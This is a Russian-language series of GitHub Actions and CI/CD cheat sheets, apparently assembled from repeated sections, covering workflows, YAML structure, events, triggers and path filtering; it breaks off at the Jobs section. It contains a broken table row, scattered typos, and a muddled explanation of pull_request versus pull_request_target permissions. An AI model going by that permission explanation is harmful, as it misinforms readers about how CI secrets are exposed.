# 🛠 Тема: Что такое CI/CD?

Если коротровать до предела: **CI/CD — это конвейер (pipeline) для вашего кода.** 

Представь завод по производству автомобилей. Ты не можешь просто выкатить собранную машину на дорогу, не проверив двигатель, тормоза и наличие колес. CI/CD — это та самая автоматизированная линия, которая проверяет каждую деталь и сама везет готовую машину в автосалон.

---

## 1. CI — Continuous Integration (Непрерывная интеграция)
**Суть:** Это практика частого слияния кода разработчиков в общую ветку (обычно `main`).

Когда несколько человек работают над одним проектом, возникает риск «ада слияния» (merge hell), когда через неделю работы выясняется, что код одного ломает код другого. CI решает эту проблему.

**Что происходит в CI-пайплайне:**
1.  **Build (Сборка):** Код компилируется, зависимости (npm, pip, go mod) подтягиваются, Docker-образы собираются.
2.  **Test (Тестирование):** Запускаются Unit-тесты, линтеры (проверка стиля кода) и статические анализаторы.
3.  **Check (Проверка):** Проверка безопасности и качества кода.

**Главная цель:** Как можно раньше обнаружить ошибку. Если ты сломал код — CI «покраснеет» (fail) и сразу скажет тебе об этом, пока ты еще помнишь, что именно изменил.

---

## 2. CD — Два разных подхода
Здесь часто возникает путаница. В индустрии под **CD** понимают две разные вещи:

### A) Continuous Delivery (Непрерывная доставка)
Код всегда **готов** к деплою. После того как все тесты прошли, артефакт (например, Docker-образ или `.zip` архив) создается и кладется «на полку» (в реестр). 
*   **Нюанс:** Чтобы выкатить это в продакшн, **нужен человек**, который нажмет кнопку «Deploy». Это безопасно для критически важных систем.

### Б) Continuous Deployment (Непрерывное развертывание)
Это высший пилотаж. Здесь нет кнопки «Deploy». Если код прошел все проверки в CI, он **автоматически** улетает на сервера (Production). 
*   **Нюанс:** Это требует идеального покрытия тестами. Ошибка в тестах здесь означает мгновенный упадок продакшена.

---

## 3. Резюме: Схема процесса
`Commit Code` $\rightarrow$ `CI (Build + Test)` $\rightarrow$ `Artifact Creation` $\rightarrow$ **[Decision Point]** $\rightarrow$ `CD (Deploy to Staging/Prod)`

| Этап | Что делает автоматика | Результат |
| :--- | :--- | :---, что код работает |
| **CI** | Проверяет синтаксис, тесты, линтеры | Уверенность в качестве кода |
| **CD (Delivery)** | Готовит пакет для деплоя | Готовый к работе артефакт |
| **CD (Deployment)** | Обновляет сервера/кластеры | Работающий функционал у пользователя |

## 💡 Нюансы от Senior-инженера (О чем не пишут в учебниках)

1.  **Pipeline Speed matters:** Если твой CI идет 40 минут, разработчики начнут его игнорировать или делать коммиты раз в день. Быстрый CI — это залог высокой скорости разработки (Velocity).
2.  **Тесты — это фундамент:** CI/CD без хороших тестов — это просто автоматизированный способ быстро ломать продакшн. Бессмысленно автоматизировать деплой, если у тебя нет автотестов.
3.  **Fail Fast:** Настраивай пайплайн так, чтобы самые быстрые и дешевые проверки (линтеры) шли первыми, а тяжелые (интеграционные тесты) — последними. Если код кривой, не нужно тратить 20 минут на сборку Docker-образа.
4.  **Idempotency (Идемпотентность):** Твой процесс деплоя должен быть таким, чтобы его можно было запускать 10 раз подряд на одной и той же версии кода, и результат всегда был одинаковым.

## ❓ FAQ (Часто задаваемые вопросы)

**В: Можно ли использовать CI/CD только для части проекта?**
**О:** Да, это нормальная практика при переходе от монолита к микросервисам. Каждый сервис имеет свой независимый пайплайн.

**В: Что если тесты прошли, а деплой упал? Это всё еще CD?**
**О:** Да. CD — это про процесс доставки кода. Если инфраструктурный скрипт упал при деплое, значит, у тебя проблема в этапе *Deployment*, но концепция CI/CD всё еще применяется к твоему процессу.

**В: Чем отличается Continuous Delivery от Continuous Deployment?**
**О:** Ключевое отличие — **наличие ручного вмешательства**. В Delivery человек нажимает «Deploy», в Deployment — всё происходит само после успешных тестов.

**В: Нужен ли CI/CD, если проект очень маленький?**
**О:** Да. Даже для маленького проекта автоматизация проверки синтаксиса и сборки экономит время и защищает от глупых ошибок типа «забыл обновить зависимость».

# 🧠 Шпаргалка: Основные понятия GitHub Actions

GitHub Actions — это не просто инструмент для CI/CD (Continuous Integration / Continuous Deployment). Это **автоматизатор событий**. Любое действие в твоем репозитории может запустить цепочку автоматических действий.

### 1. Workflow (Ворклоу / Рабочий процесс)
Это самый верхний уровень. Это твой сценарий, описанный в `.yml` файле.
*   **Где живет:** Только в папке `.github/workflows/`.
*   **Суть:** Один файл = один workflow. Например, `tests.yml`, `deploy.yml`, `linting.yml`.
*   **Нюанс:** В одном репозитории может быть десятки разных workflow, работающих независимо или связанных друг с другом.

### 2. Event (Событие / Триггер)
Это «спусковой крючок». То, что заставляет Workflow проснуться и начать работу.
*   **Примеры:** `push` (запушили код), `pull_request` (создали запрос на слияние), `schedule` (наступило 12:00 по cron), `workflow_dispatch` (ты нажал кнопку «Запустить» вручную).
*   **Нюанс:** События можно фильтровать. Не нужно запускать тяжелые тесты на каждый коммит в документацию; можно настроить запуск только при изменениях в папке `/src`.

### 3. Job (Задание)
Это набор шагов, которые выполняются на одном и том же раннере (сервере).
*   **Суть:** Представь, что Job — это отдельная виртуальная машина, которая поднялась, сделала работу и самоуничтожилась.
*   le **Нюанс (Важно!):** По умолчанию все Jobs в одном Workflow запускаются **параллельно**. Если у тебя три Job (`test`, `lint`, `build`), они будут пытаться работать одновременно. Чтобы выстроить их в очередь, нужно использовать ключевое слово `needs`.

### 4. Step (Шаг)
Самая мелкая единица работы внутри Job. Шаги выполняются строго **последовательно**.
*   **Типы шагов:**
    1.  `run`: Выполнение команды в терминале (например, `npm install`).
    2.  `uses`: Использование готового экшена (готового инструмента).
*   **Нюанс:** Если один шаг упал с ошибкой, все последующие шаги в этой Job прерываются (если ты не настроил иначе через `continue-on-error`).

### 5. Action (Экшен)
Это «черный ящик» с готовой логикой. Это переиспользуемый кусок кода, который кто-то уже написал за тебя.
*   **Суть:** Вместо того чтобы писать 20 строк кода для настройки Python, ты просто пишешь `uses: actions/setup-python@v4`.
*   **Нюанс:** Экшены бывают трех видов: Docker-экшены (тяжелые, но мощные), JavaScript-экшены (быстрые) и Composite-экшены (набор шагов).

### 6. Runner (Раннер / Исполнитель)
Это сервер (виртуальная машина или контейнер), на котором физически крутятся твои команды.
*   **GitHub-hosted runners:** Серверы, которые предоставляет сам GitHub (Ubuntu, Windows, macOS). Тебе не нужно их админить, но ты платишь за минуты использования.
*   **Self-hosted runners:** Твой собственный сервер. Ты сам его настраиваешь, он бесплатный (в плане минут), но ты сам отвечаешь за его безопасность и обновление.

---

### ❓ FAQ (Частые вопросы)

**В: В чем разница между Job и Step?**
**О:** Представь стройку. **Job** — это отдельная бригада строителей. **Step** — это конкретное действие одного рабочего в этой бригаде (положить кирпич, замешать цемент). Бригады могут работать на разных объектах одновременно (параллельно), но рабочие внутри одной бригады делают задачи по очереди.

**В: Что произойдет, если я запушу код в ветку `feature`, а триггер настроен только на `main`?**
**О:** Ничего. Workflow даже не «проснутся». Событие произошло, но фильтр его отсек. Это экономит твои деньги и ресурсы.

**В: Могут ли Jobs обмениваться данными?**
**О:** Напрямую — нет, так как это разные виртуальные машины. Но они могут обмениваться через **Artifacts** (сохранение файлов) или через **Outputs** (передача строковых значений).

**В: Можно ли запустить один Workflow из другого?**
**О:** Да, это называется `workflow_call` (Reusable Workflows). Это отличный способ избежать дублирования кода (принцип DRY).

# 📘 Шпаргалка: Структура YAML-файла в GitHub Actions

YAML (YAML Ain't Markup Language) — это формат передачи данных, который строится на **отступах**. В GitHub Actions файл `.github/workflows/main.yml` — это «рецепт» автоматизации. Если ты ошибёшься с отступом, весь рецепт рассыплется.

## 🏗 Иерархия Workflow (Сверху вниз)

Представь workflow как матрешку. Сверху самый крупный уровень, внутри него — детали поменьше.

### 1. Уровень Workflow (Глобальный)
Это корень файла. Здесь мы определяем общие правила для всего процесса.
*   `name`: Название твоего пайплайна. То, что ты увидишь в интерфейсе GitHub.
*   `on`: **Самый важный ключ.** Определяет триггеры (события), при которых запускается этот файл (`push`, `pull_request`, `schedule`).
*   `env`: Глобальные переменные окружения. Они доступны во всех Jobs и Steps этого файла.
*   `permissions`: Настройка прав доступа `GITHUB_TOKEN`. *Senior tip: Всегда ограничивай права до минимума (Principle of Least Privilege).*

### 2. Уровень Job (Задание)
Workflow состоит из одного или нескольких Jobs. 
*   **Важно:** По умолчанию все Jobs запускаются **параллельно**.
*   `runs-on`: На какой операционной системе будет работать задание (`ubuntu-latest`, `windows-latest`).
*   `needs`: Ключ для создания зависимостей. Если Job B должен ждать завершения Job A, мы пишем `needs: [Job_A]`. Это превращает параллелизм в последовательность.
*   `strategy`: Настройка матричного запуска (например, проверка на разных версиях Node.js).
*   `if`: Условная логика. Запускать этот Job только если условие истинно.

### 3. Уровень Step (Шаг)
Внутри каждого Job есть последовательность шагов. Они выполняются строго **один за другим**.
*   `uses`: Использование готового экшена (Action) из Marketplace или локального.
*   `run`: Выполнение консольной команды (bash, pwsh). Это «сердце» автоматизации.
*   `with`: Входные параметры для экшена (`uses`). Как аргументы функции.
*   `env`: Переменные окружения, видимые **только внутри этого конкретного шага**.
*   `continue-on-error`: Если `true`, то даже если шаг упал, пайплайн пойдет дальше.

---

## 🛠 Визуальная схема структуры

```yaml
name: My Awesome Workflow       # 1. Глобальный уровень (Name)

on:                             # 1. Глобальный уровень (Trigger)
  push:
    branches: [ main ]

env:                            # 1. Глобальный уровень (Global Env)
  GLOBAL_VAR: "I am everywhere"

jobs:                           # 2. Уровень Jobs
  build-job:                  # ID задания (может быть любым)
    runs-on: ubuntu-latest     # ОС для выполнения
    needs: [setup-job]        # Зависимость от другого Job
    
    steps:                      # 3. Уровень Steps
      - name: Checkout code     # Описание шага (для логов)
        uses: actions/checkout@v4 # Использование экшена

      - name: Run a script      # Выполнение команды
        run: echo "Hello World"
        env:                    # 3. Уровень Step (Local Env)
          STEP_VAR: "Only here"
```

## ⚠️ Нюансы и «подводные камни» (Senior Insights)

1.  **Отступы — это всё.** Используй только **пробелы**. Никогда не используй табуляцию (Tab). Один лишний пробел может превратить переменную из глобальной в локальную или вообще сломать парсинг.
2.  **Типизация данных.** YAML пытается угадать тип данных. 
    *   `true` — это булево значение.
    *   `"true"` — это строка. 
    *   Если в строке есть спецсимволы (двоеточия, скобки), всегда бери строку в кавычки.
3.  **Область видимости (Scope).** Помни иерархию: `Global Env` > `Job Env` > `Step Env`. Если ты определил переменную в `env` на уровне Workflow, а потом переопределил её в `steps.env`, внутри шага будет работать новая версия.
4.  **Регистр ключей.** Ключи YAML чувствительны к регистру (`On` и `on` — это разные вещи, и второй — правильный).

## ❓ FAQ (Часто задаваемые вопросы)

**В: Можно ли запустить один Job после другого?**
О: Да, используй ключевое слово `needs`. Без него GitHub запустит их одновременно, что может привести к конфликтам, если они работают с одним и тем же ресурсом.

**В: Чем `run` отличается от `uses`?**
О: `uses` — это вызов готового инструмента (как импорт библиотеки), а `run` — это написание своего кода/скрипта прямо «на месте».

**В: Что будет, если я забуду указать `runs-on`?**
О: Workflow упадет с ошибкой синтаксиса. GitHub должен знать, на каком железе запускать твой код.

**В: Как передать данные из одного Job в другой?**
О: Это делается через `outputs`. Ты должен объявить `outputs` на уровне Job и сохранить туда значение через файл `$GITHUB_OUTPUT`. (Это мы разберем в теме "Contexts & Outputs").

# 🚀 Шпаргалка: Жизненный цикл Workflow

**Workflow Lifecycle** — это путь вашего кода от момента совершения действия (события) до финального статуса (успех/провал). Понимание этого цикла критично для построения надежных пайплайнов и предотвращения «зависших» или дублирующих процессов.

---

### 1. Триггер (The Trigger / Event)
Всё начинается с **Event**. Это внешнее или внутреннее событие, которое говорит GitHub: «Эй, пора запускать код!».
*   **Типы:** `push`, `pull_request`, `workflow_dispatch` (ручной), `schedule` (cron).
*   **Нюанс:** Одно событие может запустить сразу несколько разных workflow-файлов, если они подписаны на один и тот же триггер.

### 2. Очередь и Выбор Раннера (Queueing & Picking)
Как только событие произошло, GitHub создает **Workflow Run** (экземпляр выполнения).
*   Запуск попадает в очередь.
*   GitHub ищет свободный **Runner** (GitHub-hosted или ваш Self-hosted), который соответствует параметрам вашего `runs-on`.
*   **Нэнюс (Concurrency):** Если вы используете ключ `concurrency`, GitHub может не запускать новый workflow, а отменить старый, который еще работает. Это критично для деплоя, чтобы два процесса не правили одну и ту же базу данных одновременно.

### 3. Выполнение Заданий (Jobs Execution)
Workflow состоит из одного или нескольких **Jobs**. 
*   **Параллелизм по умолчанию:** Все Jobs запускаются **одновременно** (параллельно), если вы явно не указали обратное.
*   **Зависимости (`needs`):** Чтобы создать цепочку (например: *Сначала Тесты $\rightarrow$ Потом Деплой*), нужно использовать ключевое слово `needs`. Это превращает ваш workflow из набора разрозненных задач в **DAG** (направленный ациклический граф).
*   **Изоляция:** Каждый Job запускается в абсолютно чистой, новой виртуальной машине (или контейнере). Данные из Job A не видны в Job B сами по себе.

### 4. Выполнение Шагов (Steps Execution)
Внутри каждого Job есть **Steps**. Это линейная последовательность действий.
*   **Строгая последовательность:** Шаги выполняются строго один за другим.
*   **Прерывание:** Если шаг с командой `run` завершился с ненулевым кодом ошибки (exit code != 0), выполнение текущего Job **немедленно останавливается**. Все последующие шаги в этом Job будут пропущены.
*   **Нюанс (`continue-on-error`):** Если вы хотите, чтобы шаг упал, но пайплайн пошел дальше (например, для отправки уведомлений или генерации отчетов), используйте `continue-on-error: true`.

### 5. Завершение (Final State)
Workflow завершается одним из статусов:
*   ✅ **Success:** Все Jobs и все Steps прошли успешно.
*   ❌ **Failure:** Хотя бы один шаг в одном из Jobs упал.
*   🚫 **Cancelled:** Кто-то нажал "Cancel workflow" или сработал `concurrency` (отмена старой ветки).

### 💡 Senior Tips (Нюансы для профи)

1.  **Zombie Workflows:** Всегда ставьте `timeout-minutes`. Если ваш скрипт зависнет (например, ждет ответа от сервера, который не отвечает), GitHub будет держать раннер занятым до стандартного лимита (часто это 6 часов!), сжигая ваши минуты/деньги.
2.  **Artifacts are the bridge:** Помните, что Jobs изолированы. Если Job №1 собрал бинарный файл, а Job №2 должен его задеплоить — используйте `actions/upload-artifact` и `actions/download-artifact`. Без этого "жизненный цикл" прервется на этапе передачи данных.
3.  **Post-steps:** Существуют «скрытые» шаги, которые запускаются автоматически при завершении Job (например, очистка кэша или удаление временных файлов). Это часть жизненного цикла, о которой часто забывают.

### ❓ FAQ (Частые вопросы)

**В: Что произойдет с Job "Deploy", если Job "Test" упал?**
**О:** Если в Job "Deploy" прописано `needs: [Test]`, то деплой **не начнется**. GitHub пометит его как `Skipped`. Это стандартное поведение для защиты продакшена.

**В: Можно ли запустить один и тот же workflow дважды одновременно?**
**О:** Да, если вы не настроили `concurrency`. Но это опасно (race condition). Если это деплой — лучше использовать `concurrency` с группировкой по ветке или окружению.

**В: Почему мой шаг в Step выполняется, хотя предыдущий упал?**
**О:** Скорее всего, у этого шага стоит параметр `continue-on-error: true`. Проверьте YAML.

**В: Как передать переменную из одного Job в другой в процессе жизненного цикла?**
**О:** Через **Outputs**. Вам нужно объявить `outputs` на уровне Job, сохранить значение в `$GITHUB_OUTPUT` внутри Step, и затем обратиться к нему через контекст `${{ needs.job_id.outputs.variable_name }}`.

# ⚡️ Шпаргалка: Типы событий (Events) в GitHub Actions

**Событие (Event)** — это «триггер», сигнал, который говорит GitHub: «Эй, пора запускать этот Workflow!». Без события workflow будет просто мертвым файлом в твоем репозитории.

Все события можно разделить на четыре большие группы.

---

### 1. Git-события (Самые частые)
Это всё, что происходит с кодом внутри репозитория.

*   **`push`**: Срабатывает, когда ты делаешь `git push`. Это база. Запускается при создании новых веток, пуше в существующие и создании тегов.
    *   *Нюанс:* Можно (и нужно!) фильтровать по веткам (`branches`) и путям к файлам (`paths`), чтобы не гонять тесты на изменение документации `README.md`.
*   **`pull_request`**: Срабатывает при создании, обновлении (синхронизации) или закрытии PR. 
    *   *Нюанс:* Важно различать типы действий: `opened`, `synchronize` (когда добавили новый коммит в PR), `closed`.
*   **`create` / `delete`**: Срабатывают, когда создается или удаляется ветка/тег.

### 2. Расписанные события (Automation)
Когда нужно, чтобы всё работало само по себе по расписанию.

*   **`schedule`**: Использует синтаксис **cron**. Позволяет запускать задачи (например, ночные тесты или очистку кэша) в определенное время.
    *   *Нюанс:* GitHub не гарантирует запуск секунда-в-секунду. Если ты поставил `0 * * * *` (каждый час), он может прийти с задержкой в 5–10 минут из-за нагрузки на сервера GitHub.

### 3. Ручные и внешние события (Manual & External)
Когда нужно нажать на кнопку или вызвать процесс извне.

*   **`workflow_dispatch`**: Добавляет кнопку **"Run workflow"** прямо в интерфейсе GitHub. 
    *   *Нюанс:* Это киллер-фича для деплоя на Production. Ты можешь определить `inputs` (вводные данные), например, выбор окружения или версии приложения, прямо перед запуском.
*   **`repository_dispatch`**: Позволяет запускать workflow через API извне GitHub (например, из твоего собственного сервиса, Jenkins или скрипта на Python). Это способ связать GitHub с внешним миром.

### 4. События взаимодействия Workflow (Orchestration)
Когда один процесс управляет другим.

*   **`workflow_call`**: Используется для **Reusable Workflows**. Позволяет одному workflow вызывать другой как функцию. Это основа DRY (Don't Repeat Yourself) в CI/CD.
*   **`workflow_run`**: Срабатывает, когда завершается *другой* workflow. Например: "Запусти деплой только после того, как успешно завершится Workflow с тестами".

---

### 💡 Senior Nuances (На что обратить внимание)

1.  **Фильтрация (Filters)** — Это твой главный инструмент экономии денег и времени. Никогда не запускай тяжелые тесты на любое изменение в репозитории. Используй `paths-ignore` для файлов, которые не влияют на логику (документация, конфиги CI).
2.  **Payload (Полезная нагрузка)** — Каждое событие несет в себе данные. При `pull_request` у тебя есть доступ к номеру PR, автору и диффу (изменениям). При `workflow_dispatch` — к твоим кастомным `inputs`. Умей использовать контекст `github.event`.
*   **События-цепочки** — Будь осторожен с `workflow_run`. Если настроить их неправильно, можно создать бесконечную петлю (рекурсию), где один workflow запускает другой, а тот снова первый.

---

### ❓ FAQ (Частые вопросы)

**В: Почему мой `push` не запускает workflow, хотя я всё написал правильно?**
**О:** Проверь фильтры `branches` или `paths`. Скорее всего, ты пушишь в ветку, которая не указана в конфиге, или меняешь файлы, которые попадают под `paths-ignore`.

**В: В чем разница между `workflow_dispatch` и `repository_dispatch`?**
**О:** `workflow_dispatch` — это про человека (кнопка в UI). `repository_dispatch` — это про систему (запрос через API/Webhooks).

**В: Можно ли запустить один и тот же workflow и по пушу, и вручную?**
**О:** Да. В секции `on:` просто перечисли оба события:
```yaml
on:
  push:
    branches: [main]
  workflow_dispatch: # Добавит кнопку ручного запуска
```

**В: Как запустить workflow только когда закрывается Pull Request (без мерджа)?**
**О:** Используй фильтр типов событий:
```yaml
on:
  pull_request:
    types: [closed]
```

# 🚀 Тема: Расширенные триггеры (Advanced Triggers)

Если базовые `push` и `pull_request` — это рефлексы, то расширенные триггеры — это **интеллект** твоего CI/CD. Они позволяют строить сложные цепочки автоматизации, реагировать на внешние события и управлять процессами без участия человека.

### 1. `schedule` — Автоматизация по расписанию (Cron)
Позволяет запускать workflow в определенное время. Использует стандартный синтаксис **cron**.
*   **Зачем:** Ежедневные проверки безопасности, очистка старых артефактов, генерация отчетов, ночные тесты.
*   **Нюансы (Senior Tips):**
    *   **Задержки:** Не жди точности до секунды. GitHub может задерживать выполнение задач (особенно на бесплатных тарифах) из-за нагрузки на инфраструктуру.
    *   **Часовой пояс:** Всегда используй **UTC**. Не полагайся на свое локальное время.
    *   **Пример:** `cron: '0 0 * * *'` — запуск каждый день в полночь.

### 2. `workflow_dispatch` — Ручной запуск с параметрами
Добавляет кнопку "Run workflow" в интерфейсе GitHub.
*   **Зачем:** Деплой на продакшн, ручной запуск миграций базы данных, регрессионное тестирование.
*   **Некрутая фишка (Inputs):** Ты можешь определять `inputs` (строки, булевы значения, выбор из списка). Это превращает workflow в интерактивную утилиту.
*   **Пример:** Можно спросить пользователя: *"Какой окружение деплоим? (staging/production)"*.

### 3. `repository_dispatch` — Внешний вызов через API
Позволяет запускать workflow из **любого внешнего источника** (другой репозиторий, ваш бэкенд на Python, скрипт на Bash) через HTTP POST запрос к GitHub API.
*   **Зачем:** Интеграция с внешними системами. Например, когда в вашей CMS обновился контент, она шлет сигнал в репозиторий, чтобы запустить сборку сайта.
*   **Нюанс:** Используй поле `client_payload`, чтобы передавать JSON-данные внутрь workflow.

### 4. `workflow_run` — Цепочки (Workflow Chaining)
Позволяет запускать один workflow только тогда, когда завершился другой.
*   **Зачем:** Создание зависимых пайплайнов. Например: "Сначала запусти `Build`, и если он прошел успешно — запусти `Integration Tests`".
*   **Нюанс:** Будь осторожен с бесконечными циклами (когда workflow A запускает B, а B снова триггерит A).

### 5. `workflow_call` — Переиспользуемые workflow (Reusable Workflows)
Это не совсем «событие», это механизм вызова. Позволяет превратить один workflow в "функцию", которую можно вызвать из другого.
*   **Закрепи в голове:** Это основа для соблюдения принципа **DRY** (Don't Repeat Yourself). Вместо того чтобы копировать 100 строк YAML в каждый репозиторий, ты создаешь один эталонный workflow и вызываешь его.

### 6. Фильтрация событий (Advanced Filtering)
Самый важный инструмент для экономии ресурсов и чистоты логов.
*   **`paths` / `paths-ignore`:** Запускай тесты только если изменились файлы в папке `/src`. Если поменялся только `README.md` — не трать время раннера.
*   **`branches` / `tags`:** Ограничение области действия (например, деплой только при создании тега `v*`).
*   **`types` для событий:** Для событий вроде `issues` или `pull_request` можно указать конкретный тип: `opened`, `closed`, `synchronize`.

### 🧠 FAQ (Часто задаваемые вопросы)

**В: Могу ли я использовать `schedule` вместе с `push`?**
**О:** Да, это стандартная практика. Ты можешь перечислить несколько триггеров в одном файле. Workflow запустится либо по пушу, либо по расписанию.

**В: Как передать данные из `repository_dispatch` в шаги workflow?**
**О:** Данные приходят в контексте `github.event.client_payload`. Например: `${{ github.event.client_payload.user_id }}`.

**В: В чем разница между `workflow_run` и `workflow_call`?**
**О:** 
*   `workflow_run` — это **реакция** на завершение (автоматически, "событийно").
*   `workflow_call` — это **явный вызов** одного файла из другого (структурно, как функция в коде).

**В: Почему мой `paths-ignore` не работает?**
**О:** Проверь синтаксис. Часто ошибка бывает в том, что ты забываешь, что `paths-ignore` работает в связке с конкретным событием. Также убедись, что пути указаны верно относительно корня репозитория.

# 🎯 Шпаргалка: Фильтрация событий (Event Filtering)

**Суть:** Фильтрация — это способ сказать GitHub: *"Запускай этот workflow только тогда, когда произошло что-то действительно важное"*. Это экономит минуты выполнения (и твои деньги/лимиты) и избавляет от "шума" в истории запусков.

Мы разделяем фильтрацию на два уровня: **уровень триггера** (до запуска workflow) и **уровень логики** (внутри запущенного workflow).

---

### 1. Уровень триггера: Фильтрация по веткам и тегам
Используется в секции `on`. Определяет, на какие изменения в репозитории реагирует workflow.

*   `branches`: Список паттернов веток, при которых запускается workflow.
    *   `main`: Только ветка main.

    *   `'feature/**'`: Все ветки, начинающиеся с `feature/` (например, `feature/login-page`).
    *   `'release/*'`: Ветки типа `release/v1`.
*   `branches-ignore`: Список веток, которые **не должны** триггерить workflow. 
    *   *Важно:* Нельзя использовать одновременно `branches` и `branches-ignore` для одного события. Выбирай что-то одно.
*   `tags`: Аналогично веткам, но для тегов (например, `'v*'` для всех версий).

**💡 Senior Tip:** Всегда используй специфичные паттерны. Если ты настроишь запуск на `*` (все ветки), твой CI будет "сходить с ума" от каждого мелкого коммита в черновиках разработчиков.

---

### 2. Уровень триггера: Фильтрация по путям (Path Filtering)
Самый мощный инструмент для **монорепозиториев**. Позволяет запускать конкретный workflow только если изменились файлы в определенной папке.

*   `paths`: Запускать, если изменены файлы в указанных директотириях.
    ```yaml
    on:
      push:
        paths:
          - 'services/api/**' # Запустит только если изменился код API
    ```
*   `paths-ignore`: Запускать для всего, **кроме** указанных файлов. Идеально для документации.
    ```yaml
    on:
      push:
        paths-ignore:
          - '**.md' # Не запускаем тесты, если поправили только README
    ```

**⚠️ Нюанс (The Gotcha):** Если ты используешь `paths` и одновременно `branches`, GitHub проверяет **оба** условия. Workflow запустится только если: *ветка подходит* **И** *путь подходит*.

---

### 3. Уровень логики: Контроль внутри Workflow (`if` condition)
Это "фильтрация постфактум". Workflow уже запустился, но мы решаем, выполнять ли конкретный `job` или `step`.

*   **Фильтрация по имени события:**
    ```yaml
    jobs:
      deploy:
        if: github.event_name == 'push' # Деплой только при пуше, а не при PR
    ```
*   **Фильтрация по ветке/тегу через контекст:**
    ```yaml
    steps:
      - name: Run heavy tests
        if: github.ref == 'refs/heads/main' # Тяжелые тесты только в main
    ```

---

### 🚀 Итоговая таблица-шпаргалка

| Инструмент | Где пишем | Когда используем | Главный плюс |
| :--- | :--- | :--- | :--- |
| **`branches`** | `on: push:` | Когда важны только стабильные ветки. | Изоляция релизных циклов. |
| **`paths`** | `on: push:` | В монорепозиториях (зависимости по папкам). | Огромная экономия ресурсов. |
| **`paths-ignore`**| `on: push:` | Чтобы игнорировать доки, конфиги, лицензии. | Убирает лишний шум в логах. |
| **`if: ...`** | `jobs:` или `steps:` | Когда логика зависит от контекста (кто, как, откуда). | Гибкость внутри одного файла. |

### ❓ FAQ (Частые вопросы)

**В: Что если я изменил и код в папке `api`, и файл `README.md`? Запустится ли workflow с `paths: ['services/api/**']`?**
**О:** Да, запустится. Если хотя бы один из измененных файлов попадает под фильтр `paths`, триггер срабатывает.

**В: Можно ли использовать `branches-ignore` вместе с `paths`?**
**О:** Да! Это отличная связка. Например: "Запускай только в ветках `develop`, и только если изменился код в папке `src`".

**О: В чем разница между `branches` и `tags` в плане фильтрации?**
**О:** С точки зрения синтаксиса — почти нет. Но с точки зрения процесса: `branches` обычно используется для CI (проверка кода), а `tags` — для CD (сборка артефакта и деплой версии).

**В: Почему мой workflow не запускается, хотя я изменил файл в нужной папке?**
**О:** Проверь два момента: 1) Не попал ли этот файл под `paths-ignore`. 2) Не находится ли твоя ветка в списке запрещенных (если используешь `branches-ignore`).

# 🚀 Шпаргалка: События репозитория (Repository Events)

**Событие (Event)** — это триггер. Это то, что говорит GitHub Actions: «Эй, пора запускать пайплайн!». Без события workflow — это просто мертвый YAML-файл в папке `.github/workflows`.

Все события можно разделить на несколько логических групп.

### 1. Git-события (Изменения в коде)
Это база CI/CD. Реакция на изменение состояния репозитория.

*   **`push`**: Срабатывает при любой отправке кода в репозиторий.
    *   *Нюанс:* По умолчанию запускается на все ветки. Всегда используй фильтры `branches` или `tags`, чтобы не гонять тяжелые тесты на каждую фичу-ветку.
*   **`pull_request`**: Срабатывает при создании, обновлении (новый коммит в PR) или закрытии PR.
    *   *Нюанс:* Важно различать состояния. Например, ты можешь захотеть запускать тесты только при `opened`, но не при `closed`.
*   **`create` / `delete`**: Срабатывает, когда создается или удаляется ветка или тег.

### 2. События взаимодействия (Interactions)
Реакция на действия пользователей в интерфейсе GitHub. Полезно для автоматизации ревью и управления задачами.

*   **`issues`**: Создание, редактирование или закрытие Issue.
    *   *Кейс:* Автоматическое назначение мейнтейнера на новые баги.
*   **`issue_comment`**: Когда кто-то пишет комментарий к Issue или PR.
    *   *Senior Tip:* Это мощнейший инструмент для создания "ChatOps". Можно настроить запуск деплоя командой `/deploy` прямо в комментариях.
*   **`pull_request_review`**: Реакция на Approve, Request Changes или комментарии к ревью.

### 3. События расписания (Scheduled Events)
Когда нам не нужен триггер от кода, а нужно «просто проверить всё по утрам».

*   **`schedule`**: Использует синтаксис **cron**.
    *   *Нюанс:* GitHub не гарантирует запуск секунда в секунду. Если ты поставил `0 9 * * *`, он может прийти в `09:15` из-за нагрузки на инфраструктуру GitHub. Не используй это для критически важных задач, зависящих от миллисекунд.

### 4. События управления (Orchestration)
События, которые связывают разные workflow между собой или позволяют запускать их извне.

*   **`workflow_dispatch`**: Ручной запуск. Добавляет кнопку "Run workflow" в интерфейсе GitHub.
    *   *Нюанс:* Позволяет передавать `inputs` (входные параметры), что делает пайплайн гибким.
*   **`workflow_run`**: Запуск одного workflow после завершения другого.
    *   *Кейс:* Сначала запускаем тесты, и если они прошли — запускаем деплой. Это позволяет разделять логику на разные файлы.
*   **`workflow_call`**: Используется для **Reusable Workflows**. Позволяет одному workflow «вызывать» другой как функцию.
*   **`repository_dispatch`**: Внешний триггер. Ты можешь отправить HTTP POST запрос из любого места (скрипт, другой сервис, вебхук) в GitHub, и это запустит твой пайплайн.

---

### 🛠 Тонкая настройка (Фильтрация)
Просто выбрать событие мало. Senior всегда ограничивает область действия:

1.  **`branches` / `tags`**: Ограничение по веткам или тегам.
2.  **`paths`**: Запуск только если изменились файлы в конкретной папке (например, только если изменился код в `/services/api`).
*   **`paths-ignore`**: Наоборот — игнорировать изменения в документации (`*.md`), чтобы не пересобирать Docker-образ из-за правки текста.

### ❓ FAQ (Часто задаваемые вопросы)

**В: Почему мой `push` триггер не сработал, хотя я запушил код?**
**О:** Проверь фильтры `branches` или `paths`. Скорее всего, ты запушил в ветку, которая не указана в конфиге, или изменения коснулись файлов, которые находятся под `paths-ignore`.

**В: В чем разница между `pull_request` и `pull_request_target`?**
**О:** Это критический вопрос безопасности. `pull_request` запускается с правами репозитория, но в контексте кода из PR (который может быть вредоносным). `pull_request_target` запускается с правами основного репозитория (с доступом к секретам!). **Никогда** не используй `pull_request_target` для автоматического тестирования стороннего кода, если там есть доступ к твоим секретам.

**В: Можно ли запустить workflow по расписанию и одновременно по push?**
**О:** Да, события в секции `on:` работают через логическое «ИЛИ». Если совпало хотя бы одно — workflow полетит.

**В: Как передать параметры при ручном запуске?**
**О:** Используй блок `inputs` внутри `workflow_dispatch`. Ты можешь определить тип (string, boolean, choice) и даже дефолтное значение.

# 🛠 Шпаргалка: Jobs (Задания) в GitHub Actions

**Job (Задание)** — это основной строительный блок твоего workflow. Если Workflow — это весь процесс сборки, то Jobs — это отдельные этапы (сборка, тесты, деплой), которые выполняются в изолированных средах.

### 1. Главное правило: Изоляция
Каждая Job запускается на **новом, чистом раннере** (виртуальной машине или контейнере). 
